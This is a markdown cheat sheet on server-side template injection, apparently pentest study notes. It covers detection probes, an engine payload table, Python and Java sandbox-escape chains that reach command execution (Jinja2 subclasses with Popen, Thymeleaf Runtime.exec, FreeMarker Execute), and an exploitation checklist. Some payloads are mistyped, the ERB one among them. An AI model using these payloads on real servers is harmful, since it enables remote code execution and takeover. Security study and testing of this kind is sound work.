# Server Side Template Injection (SSTI)

## Description 

This occurs when an attacker manages to inject code into a template that the server renders. Depending on the engine (Jinja2, Mako, Thymeleaf), it can lead to **Remote Code Execution (RCE)**.

## CSTI vs SSTI

* **CSTI (Client-Side Template Injection):** Occurs in the victim's browser (AngulaJS, Vue.js). The impact is similar to advanced XSS (cookie theft, CSRF). It does not grant access to the server.
* **SSTI (Server-Side Temprate Injection):** Occurs in the backend (Jinja2, Twing, Thymeleaf). Critical impact: Allows reading local files (LFI) or taking full control of the machine via RCE.

## Detection

Test with simple mathematical operations:
- `${7*7}`
- `{{7*7}}`
- `#{7*7}`
- `<%=7*7%>`

## Common Engines and Payloads

|   Engine    | Language |                  Test Payloads                  |
|:------------|:---------|:------------------------------------------------|
|**Jinja2**   |Python    |`{{config.items()}}`                             |
|**Thymeleaf**|Java      |`${T(java.lang.Runtime).getRuntime().exec('id')}`|
| **ERB**     |Ruby      |`<%=7*7&>`                                       |

*Recognition Tip:* Check with Wappalyzer first. If you detected Python, go straight to trying Jinja2. If you detect Java, try Thymeleaf/FreeMarker.

## Sandbox Escape Techniques (Object Introspection)

Moder engines run templates in a restricred "sandbox". To execute system commands, we must abuse introspection to escalate to native classes.

### Escape in Python (Jinja2/Mako)

We abuse language properties to find the `subprocess.Popen`.
1. **Instantiate a string:** `""`
2. **Parent class:** `"".__class__`
3. **Root base class:** `"".__class__.__mro__[1]`
4. **List native subclasses:** `"".__class__.__mro__[1].__subclasses__()`
5. **Execution(RCE):** Find the index of `subprocess.Popen` (or `os._wrap_close`) in the list above and call it to execute Bash: `{{"".__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate()}}`

### Escape in Java (Thymeleaf/FreeMarker)

* **Thymeleaf (Runtime Shortcut):** `${T(java.lang.Runtime).getRuntime().exec('calc')}`
* **FreeMarker (Instantiating Execute):** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

## Explotation Checklist

- [] Inject mathematical payloads to confirm the vulnerability.
- [] Identify whether the execution is client-side (CSTI) or server-side (SSTI).
- [] Use Wappalyzer to narrow down the backend language (Python, Java, PHP).
- [] Inject `{{7*'7'}}` or similar to identify the exact template engine.
- [] Find and implement the specific sandbox escape technique to achieve RCE.

